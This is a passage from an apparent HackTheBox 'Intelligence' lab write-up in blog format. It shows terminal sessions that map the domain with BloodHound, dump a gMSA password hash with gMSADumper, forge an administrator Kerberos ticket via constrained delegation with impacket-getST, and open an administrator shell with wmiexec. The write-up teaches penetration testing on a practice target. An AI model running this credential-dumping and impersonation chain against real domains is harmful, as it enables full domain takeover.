Progress.........: 10815488/14344385 (75.40%)
Rejected.........: 0/10815488 (0.00%)
Restore.Point....: 10813440/14344385 (75.38%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: Ms.Jordan -> Moritz17
Hardware.Mon.#1..: Util: 74%

Started: Sun Apr 10 05:49:43 2022
Stopped: Sun Apr 10 05:50:44 2022
{% endhighlight %}

{% highlight none linenos %}
┌──(kali㉿kali)-[/tmp/x]
└─$ @@bloodhound-python -c ALL -u TED.GRAVES -p Mr.Teddy -d intelligence.htb -dc intelligence.htb -ns 10.10.10.248@@
INFO: Found AD domain: intelligence.htb
INFO: Connecting to LDAP server: intelligence.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 2 computers
INFO: Connecting to LDAP server: intelligence.htb
INFO: Found 43 users
INFO: Found 55 groups
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: svc_int.intelligence.htb
INFO: Querying computer: dc.intelligence.htb
WARNING: Could not resolve: svc_int.intelligence.htb: The resolution lifetime expired after 3.2134337425231934 seconds: Server 10.10.10.248 UDP port 53 answered The DNS operation timed out.; Server 10.10.10.248 UDP port 53 answered The DNS operation timed out.
INFO: Done in 00M 13S
                                                                                                                    
┌──(kali㉿kali)-[/tmp/x]
└─$ ls
@@@20220411130157_computers.json  20220411130157_domains.json  20220411130157_groups.json  20220411130157_users.json@@@
                                                                                                                    
┌──(kali㉿kali)-[/tmp/x]
└─$ 
{% endhighlight %}

Next, we start neo4j (the bloodhound db) by executing "neo4j start". Then we execute "bloodhound" to start bloodhound.

We login

![bLogin](/assets/{{ imgDir }}/bLogin.png)


We click upload

![bUpload](/assets/{{ imgDir }}/bUpload.png)


We select our json files and press "Open"

![bSelect](/assets/{{ imgDir }}/bSelect.png)


We search for ted graves, press enter.
![bSearch](/assets/{{ imgDir }}/bSearch.png)


We find 1 group membership under "outbound" 

Clicking it shows us that ted is a member of the IT-support group which has x right on the SVC account. This means that we can read the SVC account's password and thus compromise it.

Right click.

![bOwned1](/assets/{{ imgDir }}/bOwned.png)

Changes the icon to contain a skull

![bOwned2](/assets/{{ imgDir }}/bOwned2.png)


We do the same with tiffany. Then, we navigate to the analysis tab and press 

![bShortest](/assets/{{ imgDir }}/bShortest.png)

![bShortest1](/assets/{{ imgDir }}/bShortest1.png)

![bShortest2](/assets/{{ imgDir }}/bShortest2.png)

![bShortest3](/assets/{{ imgDir }}/bShortest3.png)

If we go to the SVC node, we can find the SPN

![bAllowedToDelegate](/assets/{{ imgDir }}/bAllowedToDelegate.png)

{% highlight none linenos %}
┌──(kali㉿kali)-[/tmp/x]
└─$ @@wget https://raw.githubusercontent.com/micahvandeusen/gMSADumper/main/gMSADumper.py@@
--2022-04-11 14:16:41--  https://raw.githubusercontent.com/micahvandeusen/gMSADumper/main/gMSADumper.py
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.109.133, 185.199.110.133, 185.199.111.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.109.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 4609 (4.5K) [text/plain]
Saving to: ‘gMSADumper.py’

gMSADumper.py                100%[==============================================>]   4.50K  --.-KB/s    in 0.001s  

2022-04-11 14:16:41 (4.90 MB/s) - ‘@@@gMSADumper.py@@@’ @@@saved@@@ [4609/4609]

                                                                                                                    
┌──(kali㉿kali)-[/tmp/x]
└─$ @@python3 gMSADumper.py -u ted.graves -p Mr.Teddy -l intelligence.htb -d intelligence.htb@@
Users or groups who can read password for svc_int$:
 > DC$
 > itsupport
svc_int$:::@@@a5fd76c71109b0b483abe309fbc92ccb@@@
{% endhighlight %}

{% highlight none linenos %}
┌──(kali㉿kali)-[/tmp/x]
└─$ @@impacket-getST -spn www/dc.intelligence.htb -hashes :a5fd76c71109b0b483abe309fbc92ccb -dc-ip 10.10.10.248 -impersonate administrator intelligence.htb/svc_int@@
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Getting TGT for user
Kerberos SessionError: @@@KRB_AP_ERR_SKEW@@@(@@@Clock skew too great@@@)
{% endhighlight %}

{% highlight none linenos %}
┌──(kali㉿kali)-[/tmp/x]
└─$ @@sudo timedatectl set-ntp 0@@

┌──(kali㉿kali)-[/tmp/x]
└─$ @@date && sudo ntpdate -s intelligence.htb && date@@
Mon Apr 11 @@@02@@@:36:45 PM EDT 2022
Mon Apr 11 @@@09@@@:36:51 PM EDT 2022
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[/tmp/x]
└─$ @@impacket-getST -spn www/dc.intelligence.htb -hashes :a5fd76c71109b0b483abe309fbc92ccb -dc-ip 10.10.10.248 -impersonate administrator intelligence.htb/svc_int@@                        
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Getting TGT for user
[*] Impersonating administrator
[*]     Requesting S4U2self
[*]     Requesting S4U2Proxy
[*] @@@Saving ticket in administrator.ccache@@@

┌──(kali㉿kali)-[/tmp/x]
└─$ @@ls@@
20220411131741_computers.json  20220411131741_domains.json  20220411131741_groups.json  20220411131741_users.json   @@@administrator.ccache@@@  gMSADumper.py

┌──(kali㉿kali)-[/tmp/x]
└─$ 
{% endhighlight %}



Next, we create an environment variable named x which points to the file x which contains our tgt.

{% highlight none linenos %}
┌──(kali㉿kali)-[/tmp/x]
└─$ @@export KRB5CCNAME=administrator.ccache@@
                        
┌──(kali㉿kali)-[/tmp/x]
└─$ @@impacket-wmiexec -k -no-pass administrator@dc.intelligence.htb@@
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>@@whoami@@
@@@intelligence\administrator@@@

C:\>
{% endhighlight %}

